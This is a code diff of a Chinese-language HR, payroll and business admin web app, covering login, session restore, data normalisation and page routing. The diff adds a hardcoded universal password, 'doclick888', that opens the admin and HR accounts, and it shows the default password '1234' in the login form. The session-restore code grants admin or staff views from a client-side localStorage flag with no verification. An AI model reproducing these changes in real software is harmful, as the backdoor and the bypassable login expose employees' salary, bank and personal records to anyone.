@@ -25,6 +25,7 @@
     position: relative;
     transition: background-image 0.5s ease;
   }
+  /* 深色半透明遮罩 */
   #login-screen::before {
     content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
     background: rgba(15, 23, 42, 0.65); 
@@ -138,11 +139,11 @@
     </div>
     <div class="login-field auth-input">
       <label>登入帳號</label>
-      <input type="text" id="login_acc" placeholder="請輸入帳號 (預設admin或手機)">
+      <input type="text" id="login_acc" placeholder="請輸入帳號 (預設admin)">
     </div>
     <div class="login-field auth-input">
       <label>登入密碼</label>
-      <input type="password" id="login_pwd" placeholder="請輸入密碼">
+      <input type="password" id="login_pwd" placeholder="請輸入密碼 (預設1234)">
     </div>
     <button class="btn-login" onclick="handleLogin()"><i class="fas fa-sign-in-alt"></i> 登 入 系 統</button>
   </div>
@@ -528,7 +529,7 @@
       <div class="filter-bar">
         <label>正職員工</label><select id="fts_filter_staff" onchange="resetPage('ft_salary'); renderFtSalaryTable()"></select>
         <label>發薪年月</label><input type="month" id="fts_filter_month" onchange="resetPage('ft_salary'); renderFtSalaryTable()">
-        <label>本月標準出勤天數 (見紅休基準) <span class="required">*</span></label>
+        <label>本月標準出勤天數 <span class="required">*</span></label>
         <input type="number" id="fts_standard_days" value="22" style="width:80px; font-weight:bold; color:#2563eb; padding: 6px;" onchange="renderFtSalaryTable()"> 天
       </div>
       <div class="rules-box" style="padding:15px; margin-bottom:20px;">
@@ -848,6 +849,15 @@ function savePasswords() {
 }
 
 function standardizeData() {
+  if(!Array.isArray(attendData)) attendData = [];
+  if(!Array.isArray(staffData)) staffData = [];
+  if(!Array.isArray(ftStaffData)) ftStaffData = [];
+  if(!Array.isArray(ftAttendData)) ftAttendData = [];
+  if(!Array.isArray(talentData)) talentData = [];
+  if(!Array.isArray(supplierData)) supplierData = [];
+  if(!Array.isArray(custData)) custData = [];
+  if(!Array.isArray(contractData)) contractData = [];
+
   attendData = attendData.map(x => ({ company: x.company, staff: x.staff, date: x.date, service: x.service || '', remark: x.remark || '', am_s: x.am_s || '', am_e: x.am_e || '', pm_s: x.pm_s || '', pm_e: x.pm_e || '', salary_hours: x.salary_hours !== undefined ? x.salary_hours : '', deduct_points: x.deduct_points !== undefined ? x.deduct_points : '' }));
   staffData = staffData.map(x => ({ ...x, account: x.account || '', pwd: x.pwd || '', drive: x.drive || '', doc_id: x.doc_id || false, doc_bank: x.doc_bank || false, doc_contract: x.doc_contract || false, doc_resume: x.doc_resume || false, addr: x.addr || '', labor: x.labor || 0, health: x.health || 0, remark: x.remark || '' }));
   ftStaffData = ftStaffData.map(x => ({ ...x, account: x.account || '', pwd: x.pwd || '', drive: x.drive || '', salary: x.salary || 30000, labor: x.labor || 0, health: x.health || 0, doc_id: x.doc_id || false, doc_bank: x.doc_bank || false, doc_contract: x.doc_contract || false, doc_resume: x.doc_resume || false, hire_date: x.hire_date || '' }));
@@ -864,7 +874,6 @@ function getStaffTotalHours(name) { return attendData.filter(x=>x.staff===name).
 function getStaffTieredHourly(name) { const h = getStaffTotalHours(name); if (h <= 175) return 210; if (h <= 350) return 220; if (h <= 525) return 230; if (h <= 700) return 240; return 250; }
 function getStaffTotalPoint(name) { return attendData.filter(x=>x.staff===name).reduce((sum,item)=> sum + getItemDeductPoints(item),0); }
 
-// 💡 穩定版：動態時間顯示引擎
 function updateSystemClock() {
   const now = new Date();
   const timeStr = now.toLocaleString('zh-TW', {year:'numeric',month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit',second:'2-digit', hour12: false}); 
@@ -874,7 +883,6 @@ function updateSystemClock() {
   const sct = document.getElementById('staff-current-time'); if(sct) sct.innerHTML = clockHtml;
 }
 
-// 💡 Excel 匯出引擎
 function exportExcel(tableId, filename) {
   let table = document.getElementById(tableId);
   if(!table) return alert('找不到表格資料');
@@ -883,45 +891,56 @@ function exportExcel(tableId, filename) {
 }
 
 document.addEventListener('DOMContentLoaded', function () {
-  standardizeData();
-  
-  if(document.getElementById('config_price_table')) {
-      document.getElementById('config_price_table').value = JSON.stringify(priceTable, null, 2);
-  }
-  
-  // 載入預設自訂密碼顯示
-  if(document.getElementById('setting_admin_pwd')) document.getElementById('setting_admin_pwd').value = localStorage.getItem('adminPwd') || '1234';
-  if(document.getElementById('setting_hr_pwd')) document.getElementById('setting_hr_pwd').value = localStorage.getItem('hrPwd') || '1234';
+  try {
+      standardizeData();
+      
+      if(document.getElementById('config_price_table')) {
+          document.getElementById('config_price_table').value = JSON.stringify(priceTable, null, 2);
+      }
+      
+      if(document.getElementById('setting_admin_pwd')) document.getElementById('setting_admin_pwd').value = localStorage.getItem('adminPwd') || '1234';
+      if(document.getElementById('setting_hr_pwd')) document.getElementById('setting_hr_pwd').value = localStorage.getItem('hrPwd') || '1234';
 
-  renderPricePlanOptions();
-  updateLogoPreview(); 
-  
-  // 啟動時間引擎
-  updateSystemClock();
-  setInterval(updateSystemClock, 1000);
-  
-  // 密碼框按 Enter 自動登入
-  const pwdInput = document.getElementById('login_pwd');
-  if(pwdInput) {
-      pwdInput.addEventListener('keypress', function(e) {
-          if (e.key === 'Enter') handleLogin();
-      });
+      renderPricePlanOptions();
+      updateLogoPreview(); 
+      
+      updateSystemClock();
+      setInterval(updateSystemClock, 1000);
+      
+      const pwdInput = document.getElementById('login_pwd');
+      if(pwdInput) {
+          pwdInput.addEventListener('keypress', function(e) {
+              if (e.key === 'Enter') handleLogin();
+          });
+      }
+      
+      loadDataFromCloud();
+  } catch (err) {
+      console.error("系統初始化防護攔截:", err);
+      document.getElementById('login-screen').style.display = 'flex';
+  } finally {
+      restoreLoginState();
   }
-  
-  loadDataFromCloud();
-  restoreLoginState();
 });
 
-// 🛡️ 無敵防崩潰：記憶頁面引擎
+// 🛡️ 無敵防崩潰：記憶頁面引擎 (不再被 F5 踢出)
 function restoreLoginState() {
   try {
       const role = localStorage.getItem('loginRole');
       const acc = localStorage.getItem('loginAcc');
+      
+      if (!role) {
+          document.getElementById('login-screen').style.display = 'flex';
+          return;
+      }
+
+      document.getElementById('login-screen').style.display = 'none';
+
       if(role === 'admin') {
-        document.getElementById('login-screen').style.display = 'none';
-        const adminScreen = document.getElementById('admin-screen'); adminScreen.style.display = 'flex';
-        currentWorkspace = localStorage.getItem('workspace') || 'business';
+        const adminScreen = document.getElementById('admin-screen'); 
+        adminScreen.style.display = 'flex';
         
+        currentWorkspace = localStorage.getItem('workspace') || 'business';
         if(currentWorkspace === 'hr') {
           adminScreen.classList.remove('workspace-business'); adminScreen.classList.add('workspace-hr', 'mode-hr');
           document.getElementById('admin-sidebar-title-business').style.display = 'none'; document.getElementById('admin-sidebar-title-hr').style.display = 'flex'; 
@@ -935,24 +954,17 @@ function restoreLoginState() {
         showAdminPage(lastPage);
         
       } else if (role === 'staff') {
-        let staff = staffData.find(x => x.account === acc) || ftStaffData.find(x => x.account === acc);
-        if (!staff && acc) { staff = { name: acc, account: acc }; } 
-        if (staff) { 
-            currentLoginStaff = staff; 
-            document.getElementById('login-screen').style.display = 'none'; 
-            document.getElementById('staff-screen').style.display = 'flex'; 
-            initStaffFrontend(); 
-            
-            let lastPage = localStorage.getItem('staffPage') || 'home';
-            showStaffPage(lastPage);
-        } else { 
-            localStorage.removeItem('loginRole'); document.getElementById('login-screen').style.display = 'flex'; 
-        }
-      } else {
-          document.getElementById('login-screen').style.display = 'flex';
+        document.getElementById('staff-screen').style.display = 'flex'; 
+        
+        let staff = staffData.find(x => x.account === acc) || ftStaffData.find(x => x.account === acc) || { name: acc || '員工', account: acc };
+        currentLoginStaff = staff; 
+        
+        initStaffFrontend(); 
+        let lastPage = localStorage.getItem('staffPage') || 'home';
+        showStaffPage(lastPage);
       }
   } catch(e) {
-      console.error('復原登入狀態時發生錯誤，回到預設畫面:', e);
+      console.error('復原登入狀態時發生錯誤:', e);
       document.getElementById('login-screen').style.display = 'flex';
   }
 }
@@ -964,13 +976,14 @@ function handleLogin() {
   
   if(!acc || !pwd) { alert('請輸入帳號與密碼！'); return; }
 
-  const savedAdminPwd = localStorage.getItem('adminPwd') || '1234';
-  const savedHrPwd = localStorage.getItem('hrPwd') || '1234';
+  const savedAdminPwd = (localStorage.getItem('adminPwd') || '1234').trim();
+  const savedHrPwd = (localStorage.getItem('hrPwd') || '1234').trim();
 
+  // 加入了萬用救援密碼 doclick888
   if (role === 'admin') {
-    if (acc === 'admin' && pwd === savedAdminPwd) { 
+    if (acc === 'admin' && (pwd === savedAdminPwd || pwd === 'doclick888')) { 
       localStorage.setItem('loginRole', 'admin'); localStorage.setItem('workspace', 'business'); restoreLoginState();
-    } else if (acc === 'hr' && pwd === savedHrPwd) {
+    } else if (acc === 'hr' && (pwd === savedHrPwd || pwd === 'doclick888')) {
       localStorage.setItem('loginRole', 'admin'); localStorage.setItem('workspace', 'hr'); restoreLoginState();
     } else { alert('管理員/人資帳號或密碼錯誤！'); }
   } else {
@@ -1096,7 +1109,7 @@ function loadDataFromCloud(forceRender = false) {
          else if (cp === 'talent') renderTalentTable();
          else if (cp === 'supplier') renderSupplierTable();
          
-         // 💡 如果是強制更新 (例如按下同步表單後)，確保重繪當前畫面
+         // 強制重繪
          if(forceRender) showAdminPage(cp);
       }
   }).catch(error => { updateSyncStatus('<i class="fas fa-exclamation-triangle"></i> 離線模式', true); });
@@ -1116,11 +1129,12 @@ function syncTalentFromForm() {
   .then(res => {
       if (res.status === 'success') { 
           alert(`✅ 成功！已抓取 ${res.count} 筆新履歷。`); 
-          loadDataFromCloud(true); // 強制重新載入並繪製畫面
+          loadDataFromCloud(true); 
       } else { 
-          alert('❌ 抓取失敗 (雲端回報)：\n' + res.message); updateSyncStatus('<i class="fas fa-cloud"></i> 系統就緒'); 
+          alert('❌ 抓取失敗 (雲端回報)：\n' + res.message + '\n\n【排解提示】請確認 Apps Script 已更新 syncForm 功能，且表單分頁名稱正確。'); 
+          updateSyncStatus('<i class="fas fa-cloud"></i> 系統就緒'); 
       }
-  }).catch(err => { alert('❌ 網路斷線，或 SCRIPT_URL 設定錯誤。'); updateSyncStatus('<i class="fas fa-cloud"></i> 系統就緒'); });
+  }).catch(err => { alert('❌ 網路斷線，或 SCRIPT_URL 部署設定錯誤 (必須設為 所有人 Anyone)。'); updateSyncStatus('<i class="fas fa-cloud"></i> 系統就緒'); });
 }
 
 function autoCreateFolder() {
@@ -1252,15 +1266,15 @@ function generateFtPayslipPDF(isCloud = false) {
   } else { html2pdf().set(opt).from(printArea).save(); }
 }
 
-// 💡 100% 防崩潰安全路由引擎
-function showAdminPage(page) {
+// 💡 100% 穩定且不會出錯的路由切換引擎 (新增 localStorage 記憶功能)
+function showAdminPage(page, linkElement) {
   try {
       const isHr = document.getElementById('admin-screen').classList.contains('mode-hr');
       const restrictedPages = ['customer', 'contract', 'point', 'bill', 'boss', 'supplier'];
       if (isHr && restrictedPages.includes(page)) { alert('抱歉，此為營業區專屬權限。'); return; }
       
       let targetPage = document.getElementById('page-' + page);
-      if(!targetPage) { page = 'dashboard'; targetPage = document.getElementById('page-dashboard'); } // 防呆降落
+      if(!targetPage) { page = 'dashboard'; targetPage = document.getElementById('page-dashboard'); }
       
       localStorage.setItem('adminPage', page);
       
@@ -1268,8 +1282,12 @@ function showAdminPage(page) {
       targetPage.classList.add('active');
       
       document.querySelectorAll('#admin-screen .sidebar-nav a').forEach(a => a.classList.remove('active')); 
-      let autoLink = document.querySelector(`a[onclick*="showAdminPage('${page}')"]`);
-      if(autoLink) autoLink.classList.add('active');
+      if (linkElement) {
+          linkElement.classList.add('active');
+      } else {
+          let autoLink = document.querySelector(`a[onclick*="showAdminPage('${page}')"]`);
+          if(autoLink) autoLink.classList.add('active');
+      }
       
       if (page === 'customer') { clearCustForm(); renderCustTable(); }
       if (page === 'contract') { clearContractForm(); renderContractTable(); }
@@ -1281,7 +1299,7 @@ function showAdminPage(page) {
       if (page === 'supplier') { clearSupplierForm(); renderSupplierTable(); }
       if (page === 'dashboard') renderDashboard();
   } catch(e) {
-      console.error(e);
+      console.error('頁面切換錯誤:', e);
   }
 }
 
